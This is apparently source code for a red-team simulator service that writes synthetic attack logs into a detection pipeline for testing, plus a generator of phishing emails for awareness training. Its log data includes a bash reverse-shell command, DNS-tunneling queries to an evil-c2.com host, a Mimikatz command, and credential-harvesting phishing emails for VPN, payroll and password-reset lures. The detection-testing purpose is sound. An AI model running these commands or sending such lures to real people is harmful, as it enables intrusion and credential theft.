"""
SentinelAI — AI Red Team Simulator
Generates realistic attack simulations, malicious traffic patterns,
phishing scenarios, and validates detection coverage
"""
import os, json, asyncio, random, uuid, ipaddress
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any

from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import aioredis
import httpx
from loguru import logger
import uvicorn

# ─── Config ──────────────────────────────────────────────────
REDIS_URL    = os.getenv("REDIS_URL", "redis://redis:6379/0")
LOG_API_URL  = os.getenv("LOG_SERVICE_URL", "http://log-service:8002")

app = FastAPI(title="SentinelAI Red Team Simulator", version="1.0.0")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

redis_client = None

# ─── Attack Simulation Templates ─────────────────────────────
ATTACK_SCENARIOS = {

    "brute_force_ssh": {
        "name":        "SSH Brute Force Campaign",
        "description": "Simulates a dictionary-based SSH credential stuffing attack",
        "mitre":       "T1110.001",
        "events":      lambda attacker_ip, target: [
            {"log_source": "syslog", "event_type": "failed_login", "severity": "medium",
             "raw_log": f"sshd: Failed password for root from {attacker_ip} port {random.randint(40000,65535)} ssh2",
             "parsed": {"username": u, "source_ip": attacker_ip}, "source_ip": attacker_ip, "hostname": target}
            for u in ["root","admin","user","ubuntu","pi","test","oracle","postgres","git"]
        ],
    },

    "reverse_shell": {
        "name":        "Bash Reverse Shell",
        "description": "Simulates attacker establishing C2 via bash TCP socket",
        "mitre":       "T1059.004",
        "events":      lambda attacker_ip, target: [{
            "log_source": "auditd", "event_type": "command_execution", "severity": "critical",
            "raw_log": f"auditd: type=EXECVE a0=\"bash\" a1=\"-i\" a2=\">& /dev/tcp/{attacker_ip}/4444 0>&1\"",
            "parsed": {"command": "bash -i >& /dev/tcp/{}/4444 0>&1".format(attacker_ip)},
            "source_ip": attacker_ip, "hostname": target,
        }],
    },

    "port_scan": {
        "name":        "Nmap SYN Port Scan",
        "description": "Simulates network reconnaissance via SYN scan",
        "mitre":       "T1046",
        "events":      lambda attacker_ip, target: [
            {"log_source": "suricata", "event_type": "ids_alert", "severity": "medium",
             "raw_log": f"ET SCAN Nmap Scripting Engine User-Agent Detected src={attacker_ip} dst={target} port={p}",
             "parsed": {"scan_type": "SYN", "port": p}, "source_ip": attacker_ip, "hostname": target}
            for p in [22, 80, 443, 3306, 5432, 8080, 8443, 27017, 6379, 9200]
        ],
    },

    "dns_tunneling": {
        "name":        "DNS Tunneling (dnscat2)",
        "description": "Simulates C2 channel via encoded DNS queries",
        "mitre":       "T1071.004",
        "events":      lambda attacker_ip, target: [
            {"log_source": "zeek", "event_type": "dns_query", "severity": "high",
             "raw_log": f"dns: {attacker_ip} -> 8.8.8.8 query={b64}.{attacker_ip.replace('.','x')}.evil-c2.com",
             "parsed": {"query_length": len(b64)+40, "suspicious": True},
             "source_ip": attacker_ip, "hostname": target}
            for b64 in [
                "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q",
                "c2VjcmV0IGRhdGEgYmVpbmcgZXhmaWx0cmF0ZWQ",
                "dXNlcjpwYXNzd29yZEBjb3JwLWludGVybmFsLmNvbQ",
            ]
        ],
    },

    "privilege_escalation": {
        "name":        "SUID Privilege Escalation",
        "description": "Simulates attacker abusing SUID binary to gain root",
        "mitre":       "T1548.001",
        "events":      lambda attacker_ip, target: [
            {"log_source": "auditd", "event_type": "priv_escalation", "severity": "high",
             "raw_log": f"auditd: type=SYSCALL arch=x86_64 syscall=execve uid=1000 euid=0 exe=\"/usr/bin/python3\" key=\"priv_esc\"",
             "parsed": {"original_uid": 1000, "effective_uid": 0, "binary": "/usr/bin/python3"},
             "source_ip": attacker_ip, "hostname": target},
            {"log_source": "syslog", "event_type": "sudo_cmd", "severity": "high",
             "raw_log": f"sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",
             "parsed": {"from_user": "www-data", "to_user": "root", "command": "/bin/bash"},
             "source_ip": attacker_ip, "hostname": target},
        ],
    },

    "lateral_movement": {
        "name":        "SMB Lateral Movement",
        "description": "Simulates attacker pivoting via SMB/WMI across network",
        "mitre":       "T1021.002",
        "events":      lambda attacker_ip, target: [
            {"log_source": "zeek", "event_type": "smb_connection", "severity": "high",
             "raw_log": f"smb: {attacker_ip} -> {t}:445 IPC$ ADMIN$ C$",
             "parsed": {"smb_share": share, "target": t},
             "source_ip": attacker_ip, "hostname": target}
            for t, share in [("10.0.0.11","IPC$"),("10.0.0.12","ADMIN$"),("10.0.0.13","C$")]
        ],
    },

    "data_exfiltration": {
        "name":        "Data Exfiltration via HTTPS",
        "description": "Simulates large data transfer to external IP (exfiltration)",
        "mitre":       "T1041",
        "events":      lambda attacker_ip, target: [{
            "log_source": "zeek", "event_type": "conn", "severity": "high",
            "raw_log": f"zeek: conn {target} -> {attacker_ip}:443 duration=120s orig_bytes=52428800 resp_bytes=1024 service=ssl",
            "parsed": {"bytes_sent": 52428800, "bytes_recv": 1024, "duration": 120},
            "source_ip": target, "hostname": target,
        }],
    },

    "ransomware": {
        "name":        "Ransomware File Encryption",
        "description": "Simulates ransomware encrypting files across the filesystem",
        "mitre":       "T1486",
        "events":      lambda attacker_ip, target: [
            {"log_source": "auditd", "event_type": "file_modification", "severity": "critical",
             "raw_log": f"auditd: type=PATH name=\"/home/user/Documents/report_{i}.docx.encrypted\" nametype=CREATE",
             "parsed": {"encrypted_file": f"report_{i}.docx.encrypted", "extension": ".encrypted"},
             "source_ip": attacker_ip, "hostname": target}
            for i in range(1, 16)
        ] + [{
            "log_source": "syslog", "event_type": "file_modification", "severity": "critical",
            "raw_log": f"NOTE: README_DECRYPT.txt created — all your files have been encrypted. Send bitcoin to...",
            "source_ip": attacker_ip, "hostname": target,
        }],
    },

    "phishing_simulation": {
        "name":        "Spear Phishing Email",
        "description": "Simulates phishing email with malicious URL leading to credential harvest",
        "mitre":       "T1566.001",
        "events":      lambda attacker_ip, target: [{
            "log_source": "mail", "event_type": "phishing", "severity": "high",
            "raw_log": (
                "From: hr-noreply@company-secure.net Subject: [URGENT] Update Your VPN Credentials "
                f"URL: http://corp-vpn-login.xyz/auth?token=abc123 Recipient: user@corp.com"
            ),
            "parsed": {
                "sender": "hr-noreply@company-secure.net",
                "urls": ["http://corp-vpn-login.xyz/auth?token=abc123"],
                "recipient": "user@corp.com",
            },
            "source_ip": attacker_ip, "hostname": target,
        }],
    },

    "credential_dump": {
        "name":        "LSASS Credential Dump (Mimikatz)",
        "description": "Simulates Mimikatz credential extraction from LSASS",
        "mitre":       "T1003.001",
        "events":      lambda attacker_ip, target: [{
            "log_source": "winevent", "event_type": "credential_dumping", "severity": "critical",
            "raw_log": (
                "EventID=10 TargetImage=C:\\Windows\\system32\\lsass.exe "
                "SourceImage=C:\\Users\\attacker\\mimikatz.exe "
                "sekurlsa::logonpasswords privilege::debug"
            ),
            "parsed": {"tool": "mimikatz", "target": "lsass.exe", "technique": "sekurlsa"},
            "source_ip": attacker_ip, "hostname": target,
        }],
    },

    "full_attack_chain": {
        "name":        "Full APT Attack Chain",
        "description": "Simulates complete multi-stage APT: recon → initial access → escalation → exfil",
        "mitre":       "Multi-technique",
        "stages":      ["port_scan", "brute_force_ssh", "privilege_escalation", "lateral_movement", "credential_dump", "data_exfiltration"],
    },
}

# ─── Models ──────────────────────────────────────────────────
class SimulationRequest(BaseModel):
    scenario:     str
    attacker_ip:  Optional[str] = None
    target_host:  Optional[str] = None
    dry_run:      bool = False  # If True, return events without shipping them
    delay_ms:     int = 100     # Delay between events (realistic timing)

class PhishingRequest(BaseModel):
    target_email:  str
    sender_domain: str = "company-secure.net"
    subject:       str = "URGENT: Update Your VPN Credentials"
    lure_type:     str = "vpn_credentials"  # vpn_credentials | payroll | hr_policy | it_support

# ─── Startup ─────────────────────────────────────────────────
@app.on_event("startup")
async def startup():
    global redis_client
    redis_client = await aioredis.from_url(REDIS_URL, decode_responses=True)
    logger.info("Red Team Simulator started")

@app.on_event("shutdown")
async def shutdown():
    if redis_client: await redis_client.close()

# ─── Simulation Engine ───────────────────────────────────────
async def run_simulation(req: SimulationRequest) -> dict:
    attacker_ip = req.attacker_ip or f"185.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    target_host = req.target_host or f"server-{random.choice('ABCDE')}-{random.randint(1,10)}"

    scenario_data = ATTACK_SCENARIOS.get(req.scenario)
    if not scenario_data:
        raise ValueError(f"Unknown scenario: {req.scenario}")

    sim_id = str(uuid.uuid4())[:8]
    events_shipped = 0

    if req.scenario == "full_attack_chain":
        # Multi-stage simulation
        all_events = []
        for stage in scenario_data["stages"]:
            stage_data = ATTACK_SCENARIOS[stage]
            stage_events = stage_data["events"](attacker_ip, target_host)
            all_events.extend(stage_events)
        events = all_events
    else:
        events = scenario_data["events"](attacker_ip, target_host)

    # Enrich all events
    for event in events:
        event.setdefault("agent_id", f"redteam-sim-{sim_id}")
        event.setdefault("os_type", "linux")
        event.setdefault("timestamp", datetime.now(timezone.utc).isoformat())

    if not req.dry_run:
        async with httpx.AsyncClient() as client:
            for event in events:
                try:
                    await client.post(
                        f"{LOG_API_URL}/logs/ingest",
                        json=event,
                        timeout=5.0,
                    )
                    events_shipped += 1
                    if req.delay_ms > 0:
                        await asyncio.sleep(req.delay_ms / 1000)
                except Exception as e:
                    logger.warning(f"Event ship failed: {e}")
    else:
        events_shipped = len(events)

    result = {
        "sim_id":        sim_id,
        "scenario":      req.scenario,
        "scenario_name": scenario_data["name"],
        "attacker_ip":   attacker_ip,
        "target_host":   target_host,
        "mitre":         scenario_data.get("mitre", "Multiple"),
        "events_total":  len(events),
        "events_shipped":events_shipped,
        "dry_run":       req.dry_run,
        "status":        "completed",
        "timestamp":     datetime.now(timezone.utc).isoformat(),
        "events_preview":events[:3] if req.dry_run else [],
    }

    await redis_client.lpush("redteam:simulations", json.dumps({
        "sim_id": sim_id, "scenario": req.scenario,
        "status": "completed", "events": len(events),
        "timestamp": result["timestamp"],
    }))
    await redis_client.ltrim("redteam:simulations", 0, 499)

    logger.info(f"🔴 Simulation '{req.scenario}' completed: {events_shipped} events → {target_host}")
    return result

# ─── Phishing Email Generator ────────────────────────────────
def generate_phishing_email(req: PhishingRequest) -> dict:
    templates = {
        "vpn_credentials": {
            "subject": "⚠️ Action Required: Your VPN Access Expires in 24 Hours",
            "body": f"""Dear Employee,

Your corporate VPN access will expire in 24 hours due to our security policy update.

To maintain access, please verify your credentials at:
https://corp-vpn-secure.{req.sender_domain}/renew?token={uuid.uuid4().hex[:16]}

Failure to verify within 24 hours will result in loss of remote access.

IT Security Team
{req.sender_domain}""",
            "malicious_urls": [f"https://corp-vpn-secure.{req.sender_domain}/renew"],
        },
        "payroll": {
            "subject": "💰 Payroll Update — Action Required",
            "body": f"""Dear {req.target_email.split('@')[0].title()},

HR has requested you review and confirm your direct deposit details for the upcoming payroll cycle.

Update your banking information:
https://hr-payroll.{req.sender_domain}/update?emp={uuid.uuid4().hex[:8]}

Human Resources Department""",
            "malicious_urls": [f"https://hr-payroll.{req.sender_domain}/update"],
        },
        "it_support": {
            "subject": "🔧 IT Support: Password Reset Required",
            "body": f"""Your account has been flagged for suspicious activity.
Please reset your password immediately:
https://accounts.{req.sender_domain}/reset?token={uuid.uuid4().hex}

IT Support Team""",
            "malicious_urls": [f"https://accounts.{req.sender_domain}/reset"],
        },
    }
    tmpl = templates.get(req.lure_type, templates["vpn_credentials"])
    return {
        "from":           f"noreply@{req.sender_domain}",
        "to":             req.target_email,
        "subject":        tmpl["subject"],
        "body":           tmpl["body"],
        "malicious_urls": tmpl["malicious_urls"],
        "headers": {
            "X-Mailer":      "Microsoft Outlook 16.0",
            "X-Originating-IP": f"185.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "Reply-To":      f"helpdesk@{req.sender_domain}",
        },
        "ioc_type":       "phishing_email",
        "generated_at":   datetime.now(timezone.utc).isoformat(),
        "note":           "⚠️ SIMULATION ONLY — For security awareness training",
    }

# ─── Routes ──────────────────────────────────────────────────
@app.get("/health")
async def health():
    return {"status": "healthy", "service": "redteam-simulator", "scenarios": list(ATTACK_SCENARIOS.keys())}

@app.get("/redteam/scenarios")
async def list_scenarios():
    return [
        {"id": k, "name": v["name"], "description": v["description"], "mitre": v.get("mitre","Multiple")}
        for k, v in ATTACK_SCENARIOS.items()
    ]

@app.post("/redteam/simulate")
async def run_sim(req: SimulationRequest, bg: BackgroundTasks):
    """Run an attack simulation scenario."""
    if req.scenario not in ATTACK_SCENARIOS:
        raise HTTPException(400, f"Unknown scenario. Available: {list(ATTACK_SCENARIOS.keys())}")
    if req.dry_run:
        result = await run_simulation(req)
        return result
    else:
        # Fire and forget for large simulations
        sim_id = str(uuid.uuid4())[:8]
        bg.add_task(run_simulation, req)
        return {"status": "started", "sim_id": sim_id, "scenario": req.scenario}

@app.post("/redteam/phishing")
async def generate_phishing(req: PhishingRequest):
    """Generate a simulated phishing email for security awareness testing."""
    email = generate_phishing_email(req)
    return email

@app.get("/redteam/history")
async def sim_history(limit: int = 50):
    raw = await redis_client.lrange("redteam:simulations", 0, limit - 1)
    return [json.loads(r) for r in raw]

@app.post("/redteam/validate-detection")
async def validate_detection(scenario: str, bg: BackgroundTasks):
    """
    Validate detection coverage by running a scenario and checking
    if the detection engine generates the expected alert.
    """
    req = SimulationRequest(scenario=scenario, dry_run=False, delay_ms=50)
    bg.add_task(run_simulation, req)
    return {
        "status":   "simulation_launched",
        "scenario": scenario,
        "check":    "Monitor sentinelai-alerts index for matching alert within 30 seconds",
        "tip":      "Use GET /alerts/recent in the detection-engine to verify detection triggered",
    }

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8013, reload=False)
